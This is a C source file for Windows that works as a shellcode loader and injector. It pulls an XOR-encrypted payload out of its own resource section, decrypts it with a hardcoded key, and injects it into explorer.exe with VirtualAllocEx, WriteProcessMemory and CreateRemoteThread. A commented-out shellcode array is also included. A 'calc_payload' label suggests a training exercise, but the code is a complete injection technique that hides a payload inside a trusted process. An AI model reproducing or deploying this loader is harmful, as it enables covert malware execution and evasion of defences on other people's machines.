//#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "resources.h"

/*unsigned char payload[] = {
        "\xbb\x34\x2a\xa8\xe4\xda\xde\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
        "\x37\x31\x58\x13\x83\xe8\xfc\x03\x58\x3b\xc8\x5d\x18\xab\x8e"
        "\x9e\xe1\x2b\xef\x17\x04\x1a\x2f\x43\x4c\x0c\x9f\x07\x00\xa0"
        "\x54\x45\xb1\x33\x18\x42\xb6\xf4\x97\xb4\xf9\x05\x8b\x85\x98"
        "\x85\xd6\xd9\x7a\xb4\x18\x2c\x7a\xf1\x45\xdd\x2e\xaa\x02\x70"
        "\xdf\xdf\x5f\x49\x54\x93\x4e\xc9\x89\x63\x70\xf8\x1f\xf8\x2b"
        "\xda\x9e\x2d\x40\x53\xb9\x32\x6d\x2d\x32\x80\x19\xac\x92\xd9"
        "\xe2\x03\xdb\xd6\x10\x5d\x1b\xd0\xca\x28\x55\x23\x76\x2b\xa2"
        "\x5e\xac\xbe\x31\xf8\x27\x18\x9e\xf9\xe4\xff\x55\xf5\x41\x8b"
        "\x32\x19\x57\x58\x49\x25\xdc\x5f\x9e\xac\xa6\x7b\x3a\xf5\x7d"
        "\xe5\x1b\x53\xd3\x1a\x7b\x3c\x8c\xbe\xf7\xd0\xd9\xb2\x55\xbe"
        "\x1c\x40\xe0\x8c\x1f\x5a\xeb\xa0\x77\x6b\x60\x2f\x0f\x74\xa3"
        "\x14\xff\x3e\xee\x3c\x68\xe7\x7a\x7d\xf5\x18\x51\x41\x00\x9b"
        "\x50\x39\xf7\x83\x10\x3c\xb3\x03\xc8\x4c\xac\xe1\xee\xe3\xcd"
        "\x23\x80\x60\x12\xe1\x38\x46\x31\x94\xa6\xa8\xd0\x1e\x42\x94"
        "\x2b\xe6\xbe\xfa\x7a\x2e\x87\x2c\x4b\x7d\xd9\x02\x80\xb1\x05"
        "\x56\xd2\x82\x45"};
unsigned int payload_len = sizeof(payload);*/

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1)
            j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

int FindTarget(const char *procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap)
        return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if(lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);
    return pid;

}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);

    hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;

}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    HGLOBAL resHandle = NULL;
    HRSRC res;

    char key[] = "kungfoochopsslice";

    unsigned char * payload;
    unsigned int payload_len;

    int pid = 0;
    HANDLE hProc = NULL;

    // Extract payload from .rsrc
    res = FindResource(NULL, MAKEINTRESOURCE(100), RT_RCDATA);
    resHandle = LoadResource(NULL, res);
    payload = (unsigned char *) (LockResource(resHandle));
    payload_len = SizeofResource(NULL, res);

    // Allocate memory for PL
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)payload);
    printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

    // Copy PL to new memory buffer
    RtlMoveMemory(exec_mem, payload, payload_len);

    // Decrypt the PL
    XOR((char *)payload, payload_len, key, sizeof(key));

    // Make the buffer executable
    //rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    printf("\nHit me!\n");
    getchar();

    //RtlMoveMemory(exec_mem, payload, payload_len);

    // Launch PL
    /*if (rv != 0) {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }*/

    // vvv Injection process vvv
    pid = FindTarget("explorer.exe");

    if (pid) {
        printf("explorer.exe PID = %d\n", pid);
        hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                FALSE, (DWORD) pid );
        printf("hProc = %x!\n", hProc);
        getchar();
        if (hProc != NULL) {
            Inject(hProc, payload, payload_len);
            CloseHandle(hProc);
        }
    }

    return 0;

}
